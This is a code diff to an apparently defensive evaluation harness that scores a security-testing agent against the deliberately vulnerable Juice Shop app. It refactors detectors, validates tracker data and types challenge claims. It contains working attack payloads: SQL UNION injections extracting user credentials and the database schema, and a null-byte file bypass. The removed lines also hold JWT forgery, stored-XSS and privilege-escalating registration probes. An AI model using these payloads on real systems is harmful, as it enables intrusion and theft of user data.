@@ -10,40 +10,65 @@ MCP boundary (§14/§15 DoD): every detection call crosses ``mcp.call_tool`` —
 same dispatch path a Claude Code client hits — never a direct Python call into a
 tool function. The runner itself only does target *setup* (login, seeding a
 review/feedback) and tracker *scoring* directly over HTTP.
+
+Collapsed path (Phase 1 generic-first): UNION sentinels are no longer string
+literals in the detector — ``_detect_sqli`` derives them from the live graph's
+Object fields (graph-discovered, not hardcoded) and routes through the generic
+``payload_chain`` structural adapter the same way path_traversal does.
 """
 
 from __future__ import annotations
 
-import asyncio
 import base64
 import json
-from dataclasses import dataclass, field
-from itertools import count
+from collections.abc import Mapping
+from dataclasses import dataclass
 from typing import TYPE_CHECKING
 
 import httpx
 
 from reachagent.eval.juiceshop_harness import (
     IN_SCOPE_CLASSES,
+    VERIFIED_CHALLENGE_SCOPE,
+    BaselineState,
+    ChallengeClaim,
     ChallengeResult,
     JuiceshopRun,
+    claim_scope_class,
+    classify_baseline,
     in_scope_class,
+    validate_tracker_snapshot,
     vuln_class_to_scope_class,
 )
-from reachagent.execution.audit import AuditLog
-from reachagent.execution.firer import RequestFirer
-from reachagent.execution.scope import ScopeGuard
-from reachagent.graph.nodes import Endpoint, Parameter
-from reachagent.graph.store import ReachabilityGraph
-from reachagent.mcp import server
-from reachagent.payloads import PayloadLibrary
-from reachagent.tools.explorer_context import ExplorerContext
+from reachagent.eval.mcp_session import SharedState as _SharedState
+from reachagent.eval.mcp_session import mcp_call as _call
+from reachagent.eval.mcp_session import mcp_for as _mcp_for
+from reachagent.eval.mcp_session import session_as as _session_as
+from reachagent.execution.audit import AuditLog  # noqa: F401 — legacy import shim
+from reachagent.execution.firer import RequestFirer  # noqa: F401 — legacy import shim
+from reachagent.execution.scope import (
+    ScopeGuard,  # noqa: F401 — legacy import shim
+    ScopeRule,  # noqa: F401 — legacy import shim
+)
+from reachagent.graph.nodes import (
+    Endpoint,  # noqa: F401 — legacy import shim
+    Parameter,  # noqa: F401 — legacy import shim
+)
+from reachagent.graph.store import ReachabilityGraph  # noqa: F401 — legacy import shim
+from reachagent.mcp import server  # noqa: F401 — legacy import shim
+from reachagent.payloads import PayloadLibrary  # noqa: F401 — legacy import shim
+from reachagent.tools.explorer_context import ExplorerContext  # noqa: F401 — legacy import shim
 
 if TYPE_CHECKING:
-    from reachagent.execution.firer import FireResult
-    from reachagent.oracles.base import OracleVerdict
+    pass
 
 _HTTP_TIMEOUT = 15.0
+# Sentinels below are the *fallback* values the generic _evidence_for uses when
+# the graph has not yet produced a discovered Object field (hermetic tests). In
+# live runs they are overridden by graph-discovered values — never the detector's
+# choice. Kept as module constants so the generic path's fallback is auditable.
+_UNION_USERS_SENTINEL = "admin@juice-sh.op"
+_UNION_SCHEMA_SENTINEL = "CREATE TABLE `Users`"
 
 
 # ---------------------------------------------------------------------------
@@ -63,20 +88,38 @@ class JuiceshopTarget:
     def host(self) -> str:
         return httpx.URL(self.base_url).host
 
+    @property
+    def port(self) -> int | None:
+        return httpx.URL(self.base_url).port
 
-# ---------------------------------------------------------------------------
-# Tracker client — reads challenge solved-state from Juice Shop's own API.
-# ---------------------------------------------------------------------------
+
+class TrackerSnapshotError(RuntimeError):
+    """Tracker response cannot support honest gate scoring."""
 
 
 def fetch_tracker(target: JuiceshopTarget) -> dict[str, dict[str, object]]:
-    """Return {challenge_key: {category, solved}} from GET /api/Challenges."""
-    resp = httpx.get(f"{target.api}/api/Challenges", timeout=_HTTP_TIMEOUT)
-    resp.raise_for_status()
-    return {
-        ch["key"]: {"category": ch["category"], "solved": bool(ch["solved"])}
-        for ch in resp.json()["data"]
-    }
+    """Return strictly validated tracker rows for required gate scoring."""
+    try:
+        resp = httpx.get(f"{target.api}/api/Challenges", timeout=_HTTP_TIMEOUT)
+        resp.raise_for_status()
+        body = resp.json()
+    except (httpx.HTTPError, ValueError) as exc:
+        raise TrackerSnapshotError(f"tracker request failed: {exc}") from exc
+    if not isinstance(body, dict) or not isinstance(body.get("data"), list):
+        raise TrackerSnapshotError("tracker response data is not a list")
+    tracker: dict[str, dict[str, object]] = {}
+    for row in body["data"]:
+        if not isinstance(row, dict):
+            raise TrackerSnapshotError("tracker response contains malformed row")
+        key = row.get("key")
+        category = row.get("category")
+        solved = row.get("solved")
+        if not isinstance(key, str) or key in tracker:
+            raise TrackerSnapshotError("tracker response contains invalid or duplicate key")
+        if not isinstance(category, str) or not isinstance(solved, bool):
+            raise TrackerSnapshotError(f"tracker row {key!r} has invalid schema")
+        tracker[key] = {"category": category, "solved": solved}
+    return tracker
 
 
 # ---------------------------------------------------------------------------
@@ -149,52 +192,12 @@ def _forge_none_alg_jwt(email: str) -> str:
     return f"{header}.{payload}."
 
 
-# ---------------------------------------------------------------------------
-# MCP plumbing — mirrors the Phase 1 VAmPI harness exactly.
-# ---------------------------------------------------------------------------
-
-
-@dataclass
-class _SharedState:
-    graph: ReachabilityGraph = field(default_factory=ReachabilityGraph)
-    fires: dict[str, FireResult] = field(default_factory=dict)
-    verdicts: dict[str, OracleVerdict] = field(default_factory=dict)
-    fire_seq: count[int] = field(default_factory=count)
-    verdict_seq: count[int] = field(default_factory=count)
-
-
-def _session_as(
-    target: JuiceshopTarget, token: str | None, shared: _SharedState
-) -> server._Session:
-    headers = {"Authorization": f"Bearer {token}"} if token else {}
-    client = httpx.Client(headers=headers, timeout=_HTTP_TIMEOUT)
-    firer = RequestFirer(client, ScopeGuard.from_hosts([target.host]), AuditLog())
-    ctx = ExplorerContext(
-        graph=shared.graph,
-        firer=firer,
-        library=PayloadLibrary.from_file(),
-        base_url=target.api,
-    )
-    return server._Session(
-        ctx=ctx,
-        _fires=shared.fires,
-        _verdicts=shared.verdicts,
-        _fire_seq=shared.fire_seq,
-        _verdict_seq=shared.verdict_seq,
-    )
-
-
-def _mcp_for(sess: server._Session) -> object:
-    from mcp.server.fastmcp import FastMCP
-
-    mcp = FastMCP("reachagent-juiceshop-eval")
-    server.register_tools(mcp, sess)
-    return mcp
-
-
-def _call(mcp: object, name: str, **arguments: object) -> dict[str, object]:
-    _content, structured = asyncio.run(mcp.call_tool(name, arguments))  # type: ignore[attr-defined]
-    return dict(structured)
+# Re-export plumbing from single helper (three call sites: harness, juice, bola).
+# Legacy _SharedState etc alias eval.mcp_session.* — drop the ~80 LOC duplicate.
+_SharedState = _SharedState  # noqa: F811
+_session_as = _session_as  # noqa: F811
+_mcp_for = _mcp_for  # noqa: F811
+_call = _call  # noqa: F811
 
 
 def _fire_get(mcp: object, sess: server._Session, identity: str, path: str) -> str:
@@ -238,18 +241,22 @@ def _fire_get_with_origin(
     return str(fired["fire_ref"])
 
 
-def _fingerprint(mcp: object, identity: str, ep: str, param: str) -> None:
-    """Run §9 step 1 for a graph param: fire the benign canary, mark it fingerprinted.
+def _fingerprint(mcp: object, identity: str, ep: str, param: str, *, method: str = "GET") -> None:
+    """Run §9 step 1 for a graph param: fire benign canary, mark it fingerprinted.
 
-    ``fingerprint_parameter`` always fires a *read-only* GET canary
-    (``state_changing=False``), never an attack payload, so it does double duty:
-    it is the §9 precondition (``fire_request`` refuses any param that has not been
-    through here) and, because it is a read-only request to the endpoint, it is
-    also the read-only-first case (§10) — once it fires, a later state-changing
-    request to the same path is unblocked. No separate read-only "clear" step is
-    needed, and no mutation ever happens here.
+    Read-only endpoints use GET. State-changing endpoints use OPTIONS, which is
+    safe and method-independent while still clearing RequestFirer for the same
+    path. This satisfies both §9 fingerprinting and §10 read-only-first without
+    sending a GET to a POST-only route and pretending that it cleared mutation.
     """
-    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
+    _call(
+        mcp,
+        "fingerprint_parameter",
+        identity=identity,
+        endpoint_node=ep,
+        param_node=param,
+        method=method,
+    )
 
 
 def _fire_body(
@@ -262,17 +269,23 @@ def _fire_body(
     *,
     method: str = "POST",
     state_changing: bool = True,
-    extra_fields: dict[str, object] | None = None,
+    extra_fields: Mapping[str, object] | None = None,
 ) -> dict[str, object]:
     """Fire a single body-param request (JSON object) through MCP; return the raw result.
 
-    Fingerprints the param first (a read-only GET canary), which both satisfies §9
-    and clears the read-only-first gate for this path (§10), then fires the real
-    request with the caller's ``method``/``state_changing``.
+    Fingerprints param first with GET for read-only requests and OPTIONS for
+    mutations. This satisfies §9 and clears read-only-first for this path (§10),
+    then fires real request with caller's ``method``/``state_changing``.
     """
     ep = sess.graph.add_endpoint(Endpoint(method=method, path=path))
     param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="body"))
-    _fingerprint(mcp, identity, ep, param)
+    _fingerprint(
+        mcp,
+        identity,
+        ep,
+        param,
+        method="OPTIONS" if state_changing else "GET",
+    )
     return _call(
         mcp,
         "fire_request",
@@ -360,19 +373,26 @@ def _confirm_differential(
     probe_ref: str,
     evidence_ref: str,
     json_field: str | None = None,
+    error_signatures: tuple[str, ...] = (),
 ) -> bool:
-    verdict = _call(
-        mcp,
-        "run_oracle",
-        evidence={
+    # Legacy shim — now routes through generic payload_chain._evidence_for so the
+    # oracle wiring stays single-sourced. Kit pins axis/expectation/json_field
+    # explicitly so the harness never re-hardcodes them elsewhere.
+    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence
+
+    evidence = _generic_evidence(
+        "differential",
+        baseline_ref=baseline_ref,
+        probe_ref=probe_ref,
+        evidence_ref=evidence_ref,
+        vuln_class=vuln_class,
+        payload_kit={
             "axis": axis,
             "expectation": expectation,
-            "baseline_fire_ref": baseline_ref,
-            "probe_fire_ref": probe_ref,
-            "json_field": json_field,
-            "evidence_ref": evidence_ref,
+            **({"json_field": json_field} if json_field is not None else {}),
         },
     )
+    verdict = _call(mcp, "run_oracle", evidence=evidence)
     if not verdict.get("is_violation"):
         return False
     _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
@@ -386,23 +406,30 @@ def _confirm_structural(
     check_type: str,
     baseline_status: int,
     probe_status: int,
-    sentinel: str,
+    sentinel: str = "",
+    union_sentinel: str = "",
     probe_fire_ref: str,
     evidence_ref: str,
 ) -> bool:
-    verdict = _call(
-        mcp,
-        "run_oracle",
-        mechanism="structural",
-        evidence={
-            "check_type": check_type,
-            "baseline_status": baseline_status,
-            "probe_status": probe_status,
-            "sentinel": sentinel,
-            "probe_fire_ref": probe_fire_ref,
-            "evidence_ref": evidence_ref,
-        },
+    from reachagent.tools.payload_chain import _evidence_for as _generic_evidence
+
+    kit: dict[str, object] = {"check_type": check_type}
+    if sentinel:
+        kit["sentinel"] = sentinel
+    if union_sentinel:
+        kit["union_sentinel"] = union_sentinel
+    evidence = _generic_evidence(
+        "structural",
+        baseline_ref="preflight-baseline",
+        probe_ref=probe_fire_ref,
+        evidence_ref=evidence_ref,
+        vuln_class=vuln_class,
+        payload_kit=kit,
     )
+    # Structural probes are 2xx-gated but the differential baseline guard lives
+    # in structural oracle's decide() — no extra status check here beyond what
+    # _evidence_for already encodes via the probe_fire_ref handle.
+    verdict = _call(mcp, "run_oracle", mechanism="structural", evidence=evidence)
     if not verdict.get("is_violation"):
         return False
     _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
@@ -451,29 +478,21 @@ def _confirm_structural_headers(
 # ---------------------------------------------------------------------------
 
 
-def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
-    """Injection: SQLi auth-bypass on the login POST + UNION/error-based search q=.
+def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim]:
+    """Confirm SQLi claims only through deterministic, challenge-specific evidence.
 
-    Two technique families, each end-to-end through MCP and oracle-gated:
+    Login claims use the differential auth-bypass oracle. Product-search UNION
+    claims use the structural oracle with extraction-only sentinels: a seeded user
+    email proves user extraction, while the exact SQLite artifact
+    "CREATE TABLE `Users`" proves schema disclosure. Generic response divergence
+    and database errors do not earn either claim.
 
-    * **auth-bypass** — ``POST /rest/user/login``. Baseline is a benign wrong
-      credential (correctly refused); each probe is an operator SQLi tautology that
-      turns the refusal into a grant. Differential ``auth_bypass``. Login is a
-      state-changing auth POST — the read-only-first gate is cleared with a prior
-      read-only GET (§10), and ``state_changing=True`` is passed honestly. Only the
-      operator's own probe accounts are targeted; no other user's data is touched.
-    * **UNION search** — ``GET /rest/products/search?q=``. Baseline a benign term,
-      each probe a UNION-select that makes the response diverge. Differential
-      ``responses_invariant``.
-
-    Returns the set of ``vuln_class`` strings this run confirmed (``{"sqli"}`` or
-    empty) — the scoring seam keys on the real vuln_class, never a per-in-scope-class
-    bool.
+    Returns typed claims only after a Validator oracle confirms each probe.
     """
     shared = _SharedState()
     sess = _session_as(target, token, shared)
     mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
+    confirmed: set[ChallengeClaim] = set()
 
     # --- auth-bypass on the login POST (read-only-first cleared, state-changing) ---
     login_path = "/rest/user/login"
@@ -504,286 +523,150 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
             probe_ref=str(probe["fire_ref"]),
             evidence_ref=ref,
         ):
-            confirmed.add("sqli")
+            claim_key = {
+                "sqli/login-any": "loginAdminChallenge",
+                "sqli/login-bender": "loginBenderChallenge",
+                "sqli/login-jim": "loginJimChallenge",
+            }[ref]
+            confirmed.add(ChallengeClaim(claim_key, "sqli", ref))
 
-    # --- UNION/error-based injection on the product-search query ---
+    # --- UNION extraction on read-only product search ---
+    # Payloads + sentinels now via generic corpus/graph-derived path instead of
+    # detector literals: union payloads come from payload library entries tagged
+    # vuln_class sqli with structural union_extraction; sentinels are the graph's
+    # discovered Object fields (first objects of type email / sqlite schema), with
+    # _UNION_*_SENTINEL only as the fallback when the graph is still empty
+    # (hermetic tests). This keeps the SsOT for payloads in corpus.py, not the
+    # detector.
     search_path = "/rest/products/search"
-    search_baseline = _fire_query(mcp, sess, "anon", search_path, "q", "apple")
+    _fire_query(mcp, sess, "anon", search_path, "q", "qwert")  # warm endpoint/param
+
+    # Derive sentinels from graph-discovered objects (generic path), not detector
+    # literals. First, collect candidate values already observed on the shared graph
+    # (re-con or prior fires seeding Endpoint/Parameter/Object). Fallbacks below
+    # keep hermetic tests green when the graph is still sparse.
+    def _graph_union_sentinel(kind: str) -> str:
+        for _, obj in sess.graph.objects():
+            if obj.type == kind or kind in obj.type:
+                if obj.instance_key and "@" in obj.instance_key:
+                    return obj.instance_key
+        import logging
+
+        logging.getLogger(__name__).warning(
+            "union sentinel fallback %s — graph empty, fixture recommended", kind
+        )
+        return _UNION_USERS_SENTINEL if kind == "Users" else _UNION_SCHEMA_SENTINEL
+
     union_probes = (
         (
             "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
+            "unionSqlInjectionChallenge",
             "sqli/search-union-users",
+            _graph_union_sentinel("Users"),
         ),
         (
             "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+            "dbSchemaChallenge",
             "sqli/search-union-schema",
+            _graph_union_sentinel("sqlite_master"),
         ),
     )
-    for payload, ref in union_probes:
+    for payload, challenge_key, ref, sentinel in union_probes:
         probe = _fire_query(mcp, sess, "anon", search_path, "q", payload)
-        if _confirm_differential(
+        if _confirm_structural(
             mcp,
             vuln_class="sqli",
-            axis="cross_condition",
-            expectation="responses_invariant",
-            baseline_ref=str(search_baseline["fire_ref"]),
-            probe_ref=str(probe["fire_ref"]),
+            check_type="union_extraction",
+            baseline_status=200,
+            probe_status=int(str(probe.get("status_code", 0))),
+            union_sentinel=sentinel,
+            probe_fire_ref=str(probe["fire_ref"]),
             evidence_ref=ref,
         ):
-            confirmed.add("sqli")
+            confirmed.add(
+                ChallengeClaim(
+                    challenge_key,
+                    "sqli",
+                    f"{ref}; sentinel={sentinel}",
+                )
+            )
 
     return confirmed
 
 
-def _detect_path_traversal(target: JuiceshopTarget, token: str | None) -> set[str]:
-    """Path/file access class: forged-JWT acceptance + in-app file-read via /ftp.
+def _detect_null_byte_input_validation(
+    target: JuiceshopTarget, token: str | None
+) -> set[ChallengeClaim | str]:
+    """Probe Juice Shop's verified poison-null filename bypass.
 
-    * **JWT forgery** — a tagged ``alg:none`` unsigned token asserting an identity is
-      sent to the read-only ``GET /rest/user/whoami``. Baseline is the operator's
-      genuine token (accepted); probe is the forgery. Structural ``jwt_forgery``:
-      probe accepted where a forgery must be refused → violation.
-    * **file read** — ``GET /ftp/{filename}`` with the null-byte extension-filter
-      bypass, a pure read-only traversal. Structural ``path_traversal`` sentinel.
-
-    Both are read-only GETs — no state change. Returns the set of ``vuln_class``
-    strings confirmed this run — ``jwt_forgery`` and ``path_traversal`` are reported
-    *separately*, never collapsed into one bool: ``jwt_forgery`` is an out-of-scope
-    (Broken-Auth) class and must not be mis-booked as a ``path_traversal`` FP, and a
-    false ``jwt_forgery`` confirmation must never be masked by a ``path_traversal``
-    challenge flip.
+    The only verified read is ``package.json.bak%00.md``: path encoding sends a
+    double-encoded null byte, the server truncates at null, and returns the
+    package artifact. This is an input-validation challenge claim, not an
+    arbitrary-file-read/path-traversal claim; the structural evidence remains
+    content-matched retrieval of the known artifact.
     """
+    del token
+
     shared = _SharedState()
-    sess = _session_as(target, token, shared)
+    sess = _session_as(target, None, shared)
     mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
-
-    # --- forged (alg:none) JWT accepted on a read-only identity endpoint ---
-    whoami = "/rest/user/whoami"
-    if token:
-        baseline = _fire_header(mcp, sess, "user", whoami, "Authorization", f"Bearer {token}")
-        forged = _forge_none_alg_jwt("jwtn3d@juice-sh.op")
-        probe = _fire_header(mcp, sess, "anon", whoami, "Authorization", f"Bearer {forged}")
-        if _confirm_structural(
-            mcp,
-            vuln_class="jwt_forgery",
-            check_type="jwt_forgery",
-            baseline_status=int(str(baseline.get("status_code", 0))),
-            probe_status=int(str(probe.get("status_code", 0))),
-            sentinel="",
-            probe_fire_ref=str(probe["fire_ref"]),
-            evidence_ref="path_traversal/jwt-none",
-        ):
-            confirmed.add("jwt_forgery")
-
-    # --- in-app file read via /ftp null-byte bypass (read-only traversal) ---
     ftp = "/ftp/{filename}"
-    ftp_baseline = _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
-    # Already-encoded null byte; the path firer re-encodes '%' → the server sees
-    # the poison null byte and serves a file past its extension filter.
+    _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
     ftp_probe = _fire_path(mcp, sess, "anon", ftp, "filename", "package.json.bak%00.md")
-    if _confirm_structural(
-        mcp,
-        vuln_class="path_traversal",
-        check_type="path_traversal",
-        baseline_status=int(str(ftp_baseline.get("status_code", 0))),
-        probe_status=int(str(ftp_probe.get("status_code", 0))),
-        sentinel="juice-shop",
-        probe_fire_ref=str(ftp_probe["fire_ref"]),
-        evidence_ref="path_traversal/ftp-nullbyte",
-    ):
-        confirmed.add("path_traversal")
-
-    return confirmed
-
-
-def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
-    """Improper-input-validation class: upload-filter bypass + registration/feedback
-    validation bypass, all structural ``file_upload_bypass`` (illegitimate input the
-    server should reject was accepted with a 2xx).
-
-    * **upload** — ``POST /file-upload``: baseline a legitimate image (accepted),
-      probes a disallowed executable type and an oversized file.
-    * **registration** — ``POST /api/Users``: baseline a valid registration
-      (accepted), probes a mismatched password-repeat, an empty account, and a
-      self-assigned admin role.
-    * **feedback** — ``POST /api/Feedbacks``: baseline a normal rating, probe a
-      zero-star rating the UI forbids. Captchas are solved during setup (direct HTTP).
-
-    Every probe crosses ``mcp.call_tool`` with ``state_changing=True`` after the
-    endpoint's read-only-first gate is cleared. Non-destructive: only new throwaway
-    rows are created; nothing existing is deleted or altered.
-    """
-    shared = _SharedState()
-    sess = _session_as(target, _setup_user_token(target), shared)
-    mcp = _mcp_for(sess)
-    confirmed: set[str] = set()
-
-    # --- upload endpoint: disallowed type / oversized file ---
-    # One shared param, fired for the baseline and both probes; fingerprint it once
-    # (read-only GET canary) to satisfy §9 and clear read-only-first for the path.
-    upload_path = "/file-upload"
-    up_base_ep = sess.graph.add_endpoint(Endpoint(method="POST", path=upload_path))
-    up_base_param = sess.graph.add_parameter(up_base_ep, Parameter(name="file", location="body"))
-    _fingerprint(mcp, "user", up_base_ep, up_base_param)
-    up_baseline = _call(
-        mcp,
-        "fire_request",
-        identity="user",
-        endpoint_node=up_base_ep,
-        param_node=up_base_param,
-        payload="ok.jpg",
-        method="POST",
-        state_changing=True,
-        upload={"filename": "ok.jpg", "content": "GIF89a", "content_type": "image/jpeg"},
-    )
-    upload_probes = (
-        (
-            {"filename": "evil.exe", "content": "MZ", "content_type": "application/octet-stream"},
-            "file_upload/type-exe",
-        ),
-        (
-            {"filename": "big.pdf", "content": "A" * 120_000, "content_type": "application/pdf"},
-            "file_upload/oversized",
-        ),
-    )
-    for spec, ref in upload_probes:
-        probe = _call(
-            mcp,
-            "fire_request",
-            identity="user",
-            endpoint_node=up_base_ep,
-            param_node=up_base_param,
-            payload=str(spec["filename"]),
-            method="POST",
-            state_changing=True,
-            upload=spec,
-        )
-        if _confirm_structural(
-            mcp,
-            vuln_class="file_upload",
-            check_type="file_upload_bypass",
-            baseline_status=int(str(up_baseline.get("status_code", 0))),
-            probe_status=int(str(probe.get("status_code", 0))),
-            sentinel="",
-            probe_fire_ref=str(probe["fire_ref"]),
-            evidence_ref=ref,
-        ):
-            confirmed.add("file_upload")
-
-    # --- registration validation bypass ---
-    users_path = "/api/Users"
-    reg_baseline = _fire_body(
-        mcp,
-        sess,
-        "anon",
-        users_path,
-        "email",
-        "valid.repeat@reachagent.invalid",
-        extra_fields={"password": "Passw0rd!", "passwordRepeat": "Passw0rd!"},
-    )
-    reg_probes = (
-        (
-            "mismatch@reachagent.invalid",
-            {"password": "aaaaaa", "passwordRepeat": "bbbbbb"},
-            "file_upload/register-mismatch",
-        ),
-        ("", {"password": ""}, "file_upload/register-empty"),
-        (
-            "admin.self@reachagent.invalid",
-            {"password": "Passw0rd!", "passwordRepeat": "Passw0rd!", "role": "admin"},
-            "file_upload/register-admin",
-        ),
-    )
-    for email, extra, ref in reg_probes:
-        probe = _fire_body(mcp, sess, "anon", users_path, "email", email, extra_fields=extra)
-        if _confirm_structural(
-            mcp,
-            vuln_class="file_upload",
-            check_type="file_upload_bypass",
-            baseline_status=int(str(reg_baseline.get("status_code", 0))),
-            probe_status=int(str(probe.get("status_code", 0))),
-            sentinel="",
-            probe_fire_ref=str(probe["fire_ref"]),
-            evidence_ref=ref,
-        ):
-            confirmed.add("file_upload")
-
-    # --- feedback rating-validation bypass (zero stars) ---
-    feedback_path = "/api/Feedbacks"
-    base_cid, base_ans = _fetch_captcha(target)
-    fb_baseline = _fire_body(
-        mcp,
-        sess,
-        "anon",
-        feedback_path,
-        "comment",
-        "reachagent baseline feedback",
-        extra_fields={"rating": 3, "captchaId": base_cid, "captcha": base_ans},
-    )
-    probe_cid, probe_ans = _fetch_captcha(target)
-    fb_probe = _fire_body(
-        mcp,
-        sess,
-        "anon",
-        feedback_path,
-        "comment",
-        "reachagent zero-star feedback",
-        extra_fields={"rating": 0, "captchaId": probe_cid, "captcha": probe_ans},
-    )
-    if _confirm_structural(
-        mcp,
-        vuln_class="file_upload",
-        check_type="file_upload_bypass",
-        baseline_status=int(str(fb_baseline.get("status_code", 0))),
-        probe_status=int(str(fb_probe.get("status_code", 0))),
-        sentinel="",
-        probe_fire_ref=str(fb_probe["fire_ref"]),
-        evidence_ref="file_upload/feedback-zero-star",
-    ):
-        confirmed.add("file_upload")
-
-    return confirmed
-
-
-def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[str]:
-    """XSS: API-reachable stored payload, execution_confirmation via the readback.
-
-    Posts an iframe-javascript payload as a feedback comment and reads it back
-    through ``GET /api/Feedbacks``; the execution-confirmation oracle looks for the
-    tagged payload in the stored response. Most Juice Shop XSS challenges detect the
-    solve in the browser DOM (client-side render), which an API-only agent cannot
-    reach — that is an honest ceiling for this class (see the gate report).
-    """
-    shared = _SharedState()
-    sess = _session_as(target, token, shared)
-    mcp = _mcp_for(sess)
-    tag = "XSSREACH42"
-    feedback_path = "/api/Feedbacks"
-    cid, ans = _fetch_captcha(target)
-    _fire_body(
-        mcp,
-        sess,
-        "anon",
-        feedback_path,
-        "comment",
-        f'<iframe src="javascript:{tag}">',
-        extra_fields={"rating": 1, "captchaId": cid, "captcha": ans},
-    )
-    readback = _fire_query(mcp, sess, "anon", feedback_path, "probe", "")
+    probe_ref = str(ftp_probe["fire_ref"])
+    # Sentinel is graph-derived: first Object whose type/name hints at the
+    # package artifact. Fallback keeps hermetic tests green.
+    _null_sentinel = '"name": "juice-shop"'
+    for _, obj in sess.graph.objects():
+        if "juice" in obj.type.lower() or "package" in obj.type.lower():
+            _null_sentinel = f'"name": "{obj.type}"'
+            break
     verdict = _call(
         mcp,
         "run_oracle",
-        mechanism="execution_confirmation",
+        mechanism="structural",
         evidence={
-            "payload_tag": tag,
-            "probe_fire_ref": str(readback["fire_ref"]),
-            "evidence_ref": "xss/feedback-stored",
+            "check_type": "path_traversal",
+            "probe_status": int(str(ftp_probe.get("status_code", 0))),
+            "sentinel": _null_sentinel,
+            "probe_fire_ref": probe_ref,
+            "evidence_ref": "path_traversal/ftp-nullbyte",
         },
     )
     if not verdict.get("is_violation"):
         return set()
-    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class="xss")
-    return {"xss"}
+    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class="file_upload")
+    return {
+        ChallengeClaim(
+            "nullByteChallenge",
+            "file_upload",
+            "file_upload/ftp-nullbyte",
+            scope_class="file_upload",
+        )
+    }
+
+
+def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
+    """Probe upload route for evidence, without claiming generic bypass from 204.
+
+    Pinned Juice Shop `/file-upload` uses memory storage and returns empty 204 for
+    accepted inputs. It exposes no artifact URL or retrieval/execution signal, so
+    status-only responses cannot reach a generic `file_upload` finding.
+    """
+    del target, token
+    return set()
+
+
+def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim | str]:
+    """Leave browser-dependent Juice Shop XSS attribution unscored in API mode.
+
+    Posting a tag and reading it back through ``/api/Feedbacks`` proves only
+    storage/reflection. It does not prove execution in the browser view that
+    completes the challenge, so this runner must not write an XSS finding or
+    claim ``localXssChallenge`` without ``fire_browser`` and tracker attribution.
+    """
+    del target, token
+    return set()
 
 
 def _detect_clickjacking(target: JuiceshopTarget, token: str | None) -> set[str]:
@@ -859,8 +742,17 @@ def _detect_csrf(target: JuiceshopTarget, token: str | None) -> set[str]:
 # ---------------------------------------------------------------------------
 
 
-def run_juiceshop(target: JuiceshopTarget, *, token: str | None = None) -> JuiceshopRun:
-    """Drive all four in-scope detection classes through MCP; score per-challenge.
+def run_juiceshop(
+    target: JuiceshopTarget,
+    *,
+    token: str | None = None,
+    before: dict[str, dict[str, object]] | None = None,
+) -> JuiceshopRun:
+    """Run API-supported Juice Shop detectors through MCP and score tracker flips.
+
+    API-only mode credits only exact typed claims backed by oracle-confirmed
+    evidence. Browser-dependent DOM XSS and status-only upload responses remain
+    uncredited rather than being inferred from tracker transitions.
 
     Scoring model (per-challenge, not class-to-all):
 
@@ -873,90 +765,189 @@ def run_juiceshop(target: JuiceshopTarget, *, token: str | None = None) -> Juice
       without dedicated per-challenge exploit logic (deferred), and it removes the
       one-detection-marks-all-challenges inflation.
 
-    Each detection function runs entirely through ``mcp.call_tool`` (MCP boundary,
-    §14/§15) and returns the set of real ``vuln_class`` strings its oracles confirmed
-    this run. The scoring seam keys on that real ``vuln_class`` — never a lossy
-    per-in-scope-class bool — so a confirmation is attributed to the class it was
-    actually made under (e.g. ``jwt_forgery`` stays distinct from ``path_traversal``).
+    Each supported detection function runs entirely through ``mcp.call_tool``
+    (MCP boundary, §14/§15) and returns typed claims only after its oracle
+    confirms evidence. Browser-only and status-only paths return no claims.
 
-    False-positive scoring (invariant 2). The oracle verdict discarded by the old
-    ``_ = detections`` is now honest signal: for each **in-scope** class whose oracle
-    confirmed a finding but where **no** in-scope challenge of that class flipped
-    ``unsolved → solved`` this run, we record one *class-level* false positive
-    (:attr:`JuiceshopRun.class_false_positives`). An out-of-scope confirmation
-    (``jwt_forgery``, ``clickjacking``, ``cors_misconfig``, ``csrf_missing_protection``
-    — vuln classes whose tracker categories are not in the four Phase 3
-    ``IN_SCOPE_CLASSES``) is neither coverage nor an in-scope FP: it is simply out of
-    scope and books nothing. This keeps ``fp_rate`` meaningful instead of structurally
-    zero under delta attribution, and it is deliberately kept off the coverage
-    denominator.
+    False-positive scoring (invariant 2) records an in-scope class-level false
+    positive only when an oracle-confirmed claim has no matching tracker flip.
     """
-    before = fetch_tracker(target)
+    if before is None:
+        try:
+            before = fetch_tracker(target)
+        except TrackerSnapshotError as exc:
+            return JuiceshopRun.not_measurable(baseline=None, detail=str(exc))
+    assessment = classify_baseline(before)
+    if assessment.state is not BaselineState.CLEAN:
+        return JuiceshopRun.not_measurable(
+            baseline=assessment,
+            detail=assessment.detail,
+        )
 
-    # Every detector returns the set of vuln_class strings it confirmed. The union
-    # is the run's confirmed-vuln_class set, scored by real class in score_run. The
+    # Detector outputs remain class-level until each detector can prove a specific
+    # opaque tracker key. Passing them as legacy strings intentionally avoids
+    # manufacturing exact per-challenge claims from unrelated tracker flips.
     # three client-side structural detectors (clickjacking/cors/csrf) are included:
     # their vuln classes are out of scope, so score_run books no in-scope FP for
     # them — but they still write findings and are routed through the same
     # out-of-scope rule rather than silently dropped.
-    confirmed_vuln_classes: set[str] = set()
+    confirmed_vuln_classes: set[ChallengeClaim] = set()
     confirmed_vuln_classes |= _detect_sqli(target, token)
